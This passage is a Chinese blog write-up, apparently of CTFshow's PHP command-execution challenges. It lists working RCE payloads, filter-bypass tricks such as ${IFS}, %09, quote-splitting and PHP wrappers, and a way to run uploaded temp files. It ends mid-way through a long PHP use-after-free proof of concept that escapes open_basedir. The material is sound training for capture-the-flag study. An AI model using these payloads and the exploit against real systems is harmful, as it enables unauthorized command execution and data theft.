        <content type="html"><![CDATA[<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Web29-37"><a href="#Web29-37" class="headerlink" title="Web29-37"></a>Web29-37</h3><blockquote><p>都使用get传参，</p></blockquote><blockquote><p>根据被屏蔽的字词的不同考虑不同的解法</p><p>（1）system（“”）；执行一系列查看文件操作</p><p>（2）都可以一把梭 如果只对get的参数c进行限制 用eval（$_GET[]）来进行参数逃逸   如果（）被过滤可以考虑使用结构语言 include require print echo inset unset </p></blockquote><blockquote><p>常用Payload   ?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><blockquote><p>Filter伪协议 常用于读取文件&#x2F;源码</p></blockquote><h3 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h3><blockquote><p>使用了include文件包含，使用伪协议date 使后面的语句不是当成字符串类型，可以当成php语句被执行</p></blockquote><blockquote><p>短标签就是把&lt;?php 换成&lt;?&#x3D;  前提是这个功能打开</p></blockquote><blockquote><p>Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,&lt;?php system(“tac f*”);?&gt;</span><br></code></pre></td></tr></table></figure><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301424026.png" alt="image-20230530142400973" style="zoom: 50%;" /></blockquote><h3 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h3><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301533464.png" alt="image-20230530153304420"></p><blockquote><p><strong>RCE无参数</strong></p></blockquote><blockquote><p>localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</p></blockquote><blockquote><p>scandir()：获取目录下的文件，scandir(.)：获取当前目录下所有文件</p></blockquote><blockquote><p>pos()：返回数组中的当前元素的值。</p></blockquote><blockquote><p>array_reverse()：数组逆序</p></blockquote><blockquote><p>next()： 函数将内部指针指向数组中的下一个元素，并输出。</p></blockquote><blockquote><p>highlight_file()：函数进行文件内容的读取，并输出(也可用show_source)</p></blockquote> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301850412.png" alt="image-20230530185039088" style="zoom: 50%;" /><blockquote><p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><blockquote><p>?c&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301534285.png" alt="image-20230530153424249" style="zoom:50%;" /><h3 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932136.gif" alt="img"  /></h3><blockquote><p>代码中插入了&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1，“&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”的作用就是不回显。</p></blockquote><blockquote><p>（分隔符进行分割绕过）这道题和上一题差不多，不一样的是屏蔽了；可以用%0a绕过或者(%26%26)&amp;&amp;或者(%27%27)||绕过</p></blockquote><blockquote><p>不是很明白的一个点&amp;&amp;需要url编码 但是||却不要  原因：在URL内的所有不安全的字符必须被编码。保留的，预留的(Reserved)：许多URL方案为特殊的意义保留了某些字符：它们在部分URL指定方案中出现。如果相应八字节的字符是方案内部的保留字，那它必须被编码。字符; , &#x2F; , ? , : , @ , &#x3D; &amp;可能被某个方案预留用作特殊意义。在其他方案中不能保留其他字符。当一个八字节由一个字符表示并且被编码时，URL通常具有相同的解释。 但是，对于保留字符而言，这不是真的：编码一个为特定方案保留的字符可能会改变URL的语义。因此，在URL中数字、字母、特殊字符$ -_。+！*()以及保留字符要经过解码(unencoded)后才使用。另一方面，只要它们不用于保留目的，可以在URL指定方案中编码不需要编码的字符（包括字母数字）。</p></blockquote><blockquote><p>Payload：?c&#x3D;tac f*||</p></blockquote><h3 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932183.gif" alt="img"></p><blockquote><p>跟上面一题一样 多了过滤flag 用通配符就行</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932182.gif" alt="img"></p><h3 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932180.gif" alt="img"></p><blockquote><p>没什么特别的多了过滤空格常见方法如下</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">%<span class="hljs-number">09</span>（url传递）  表示的是tab (<span class="hljs-built_in">cat</span>%<span class="hljs-number">09</span>flag.php)<br><span class="hljs-variable">$</span>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><br>&lt;&gt;（<span class="hljs-built_in">cat</span>&lt;&gt;flag）<br>&lt;（<span class="hljs-built_in">cat</span>&lt;flag）<br></code></pre></td></tr></table></figure><blockquote><p>{cat,flag}原理参考：<a href="https://blog.csdn.net/m0_56059226/article/details/117997472">https://blog.csdn.net/m0_56059226/article/details/117997472</a></p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932177.gif" alt="img"></p><h3 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932197.gif" alt="img"></h3><blockquote><p>过滤多了数字 由于%09(tab)绕过空格解码后代表的是tab不属于数字不会被过滤</p></blockquote><blockquote><p>过滤了$ $$$所以不能用${IFS}绕过空格</p></blockquote><blockquote><p>沿用上一题的payload就行</p></blockquote><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932854.gif" alt="img" style="zoom: 80%;" /><h3 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932883.gif" alt="img"></p><blockquote><p>过滤了more less 等查看文件的命令 （more:一页一页的显示档案内容</p></blockquote><blockquote><p>less:与 more 类似</p></blockquote><blockquote><p>head:查看头几行</p></blockquote><blockquote><p>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p></blockquote><blockquote><p>tail:查看尾几行</p></blockquote><blockquote><p>nl：显示的时候，顺便输出行号</p></blockquote><blockquote><p>od:以二进制的方式读取档案内容</p></blockquote><blockquote><p>vi:一种编辑器，这个也可以查看</p></blockquote><blockquote><p>vim:一种编辑器，这个也可以查看</p></blockquote><blockquote><p>sort:可以查看</p></blockquote><blockquote><p>uniq:可以查看</p></blockquote><blockquote><p>file -f:报错出具体内容）还是一样用tac没什么好说的</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932941.gif" alt="img"></p><h3 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932045.gif" alt="img"></p><blockquote><p>还是过滤多了sed cut等Linux命令</p></blockquote><blockquote><p>用上一题payload</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932120.gif" alt="img"></p><h3 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932159.gif" alt="img"></p><blockquote><p>多了% 不过跟题目没啥关系 沿用上题payload</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932249.gif" alt="img"></p><h3 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932321.gif" alt="img"></p><blockquote><p>过滤了&amp;（%26）和tab（%09） 一样啊 用&lt;绕过空格</p></blockquote><blockquote><p>但是不能用？通配符 ？？？</p></blockquote><blockquote><p>利用shall特性用’’或者””或者\隔开被过滤的字符串(原理：还有一个小知识，之前我在纠结为什么ca\t或者c\at的效果和cat一样，后来经过东拼西凑的问大佬和尝试，最后总结的原因是因为在linux里面当转义符号()转义普通字符的时候，和普通字符原来的效果是一样的，意思就是\t和t都是t，只有在转义特殊字符的时候，才起了作用，比如$，$则不再表示变量的意思。)</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932459.gif" alt="img"></p><h3 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932519.gif" alt="img"></p><blockquote><p>多过滤了tac 换个nl继续用</p></blockquote><blockquote><p>或者继续ta\c</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932556.gif" alt="img"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932584.gif" alt="img"></p><h3 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932748.gif" alt="img"></p><blockquote><p>常规去做 发现过滤了上一题的&lt;&gt; 有点惯性思维去找其他解题方法 没有看见没有过滤$</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932787.gif" alt="img"></p><blockquote><p>发现被耍了 这个flag.php中不是答案</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932833.gif" alt="img"></p><blockquote><p>查看根目录下的文件夹 发现是有flag这个文件的 有两个想法 一个是直接读取里面的文件，一个是把flag复制到当前文件夹中</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932977.gif" alt="img"></p><blockquote><p>二可行</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932039.gif" alt="img"></p><blockquote><p>查看一下flag这个文件的权限有rx，应该是可以读</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932154.gif" alt="img"></p><h3 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932289.gif" alt="img"></p><blockquote><p>看了一下是echo函数 然后多了变量d后会system$c</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932337.gif" alt="img"></p><blockquote><p>常规看一下文件内容 有flag.php 直接看</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932487.gif" alt="img"></p><h3 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932592.gif" alt="img"></p><blockquote><p>在正则中 .*c.*a.*t.*相当于cat中不能穿插任何字符了，所以不能用’’绕过 考虑用mv对文件重命名</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932758.gif" alt="img"></p><h3 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932832.gif" alt="img"></p><blockquote><p>过滤了所有字母,查了资料 有两种解法 一种是通过执行的上传文件 另一种是通过&#x2F;bin&#x2F;base64输出flag </p></blockquote><blockquote><p>第二种方法试了下发现不能用 </p></blockquote><blockquote><p>仔细研究了p神的文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><blockquote><p>具体方法：。.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。（1. “ .&#x2F; “ 的方式类似于新建了一个shell， 在这个新建的shell中去执行脚本中的程序，类似于新建了一个子进程，但这个子进程不继承父进程的所有非export类型的变量，并且脚本中对非export环境变量的创建或修改不会反馈到外部调用shell中</p></blockquote><blockquote><p>\2. ” . “ 的方式类似于将脚本中的每一行指令逐条在当前shell中执行，因此它继承了当前shell的环境变量，同时脚本中对环境变量的修改也可以反馈到shell中）</p></blockquote><blockquote><p>上传的文件会临时储存在一个地址下一般为&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母。最后构造POC，执行任意命令</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006557.png" alt="image-20230530200618504"></p><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006428.png" alt="image-20230530200629352"></p><blockquote><p>最后rce</p></blockquote><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302007840.png" alt="image-20230530200713771"  /><h3 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002648.gif" alt="img"></p><blockquote><p>比55多过滤了数字和$ 应该对文件上传影响不大 尝试用文件上传</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302005771.png" alt="image-20230530200527722"></p><h3 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002650.gif" alt="img"></p><blockquote><p>多过滤了. 和? 所以不能像上一题用文件上传</p></blockquote><blockquote><p>这道题表达flag在36.php 而在system函数中也有cat和.php 只需要传参c&#x3D;36就行了</p></blockquote><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">在Linux shell中$(())是代表数学运算   ~代表取反    举个栗子：a=1,b=2<br><span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>就等同于$((<span class="hljs-number">1</span>+<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002659.gif" alt="img"></p><blockquote><p>一个很奇怪的点 -1取反再输出是显示的0 要得到一就要在加一个$((~$(())))</p></blockquote><blockquote><p>所以要输出36 需要37个</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$((~$(())))<br></code></pre></td></tr></table></figure></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002671.gif" alt="img"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002039.gif" alt="img"></p><h3 id="Web58"><a href="#Web58" class="headerlink" title="Web58"></a>Web58</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002184.gif" alt="img"></p><blockquote><p>只能一个一个试过去</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image018.gif" alt="img"></p><blockquote><p>直接读文件</p></blockquote><h3 id="Web59"><a href="#Web59" class="headerlink" title="Web59"></a>Web59</h3><blockquote><p>跟上题一样，啥也不知道</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image020.gif" alt="img"></p><blockquote><p>还是直接读就读出来了</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image022.gif" alt="img"></p><h3 id="Web60"><a href="#Web60" class="headerlink" title="Web60"></a>Web60</h3><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image024.gif" alt="img"></p><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image026.gif" alt="img"></p><h3 id="Web61-62"><a href="#Web61-62" class="headerlink" title="Web61 62"></a>Web61 62</h3><blockquote><p>还是和上一题一样的</p></blockquote><h3 id="Web66"><a href="#Web66" class="headerlink" title="Web66"></a>Web66</h3><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image028.gif" alt="img"></p><blockquote><p>查看目录</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image030.gif" alt="img"></p><blockquote><p>Print_r和var_dump 作用差不多可以替换</p></blockquote><blockquote><p>2.var_dump()和print_r()的区别</p></blockquote><blockquote><p>共同点：两者都可以打印数组，对象之类的复合型变量。</p></blockquote><blockquote><p>区别：print_r() 只能打印一些易于理解的信息，且print_r()在打印数组时，会将把数组的指针移到最后边，使用 reset() 可让指针回到开始处。 而var_dump()不但能打印复合类型的数据，还能打印资源类型的变量。且var_dump()输出的信息则比较详细，一般调试时用得多。</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image032.gif" alt="img"></p><h3 id="Web67"><a href="#Web67" class="headerlink" title="Web67"></a>Web67</h3><blockquote><p>和上一题一样</p></blockquote><h3 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h3><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image034.gif" alt="img"></p><blockquote><p>常规查目录</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image036.gif" alt="img"></p><blockquote><p>这次禁用了show_source 和highlingt_file</p></blockquote><blockquote><p>用include<img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image038.gif" alt="img"></p></blockquote><blockquote><p>然后就RCE</p></blockquote><h3 id="Web70"><a href="#Web70" class="headerlink" title="Web70"></a>Web70</h3><blockquote><p>Var_dump print_r被禁 还可以使用var_export</p></blockquote><blockquote><p>var_export() 函数用于输出或返回一个变量，以字符串形式表示。</p></blockquote><blockquote><p>var_export() 函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的是一个合法的 PHP 代码。</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020137.png" alt="image-20230530202004081"></p><blockquote><p>还是一样include方法做</p></blockquote><h3 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302034605.png" alt="image-20230530203443557"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020667.gif" alt="img"></p><blockquote><p><a href="https://blog.csdn.net/weixin_34214500/article/details/85920870?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&utm_relevant_index=2">PHP详解ob_clean,ob_start和ob_get_contents函数</a></p></blockquote><blockquote><p>这道题是先将缓冲区的内容存在s变量中，然后执行清空缓冲区可以忽略前面所有输出，再通过替换输出s变量形成看到的题目。</p></blockquote><blockquote><p>可以用exit（）直接终端进程</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302035672.png" alt="image-20230530203500613"></p><h3 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020669.gif" alt="img"></h3><blockquote><p>无权限  用glob伪协议遍历目录 (通用版)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;glob:///*.txt&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$a</span>))&#123;<br><span class="hljs-keyword">while</span>((<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$b</span>))!==<span class="hljs-literal">false</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;filename:&quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>();<br>或者<br>c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob://./*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>然后利用uaf漏洞来读取 </p></blockquote><blockquote><p>看了关于uaf漏洞的笔记：<a href="https://blog.csdn.net/musilintan/article/details/116309734?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&utm_relevant_index=1">漏洞学习笔记——UAF漏洞_孤月丶星辰的博客-CSDN博客_uaf漏洞</a></p></blockquote><blockquote><p>uaf绕过open_basedir执行命令<br>poc（需要url编码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>        <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>        <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>        <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span 